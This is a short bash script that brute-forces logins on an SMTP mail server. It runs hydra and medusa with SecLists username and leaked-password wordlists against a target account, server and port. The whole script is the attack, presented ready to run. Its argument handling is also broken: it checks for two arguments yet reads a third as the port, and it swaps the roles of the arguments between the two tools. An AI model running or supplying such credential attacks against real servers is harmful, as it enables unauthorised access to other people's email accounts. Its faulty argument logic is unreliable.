#!/bin/bash

if [ $# -eq 2 ]; then
    hydra -v -l $1 -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -s $3 -e nsr -o "smtp_$2_$3_hydra.txt" -f smtp://$2
    medusa -v 4 -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -f -e ns -n $2 -O "smtp_$1_$2_medusa.txt" -M smtp -h $1
else
    echo "Please provide the target email account, the SMTP server and its port."
fi
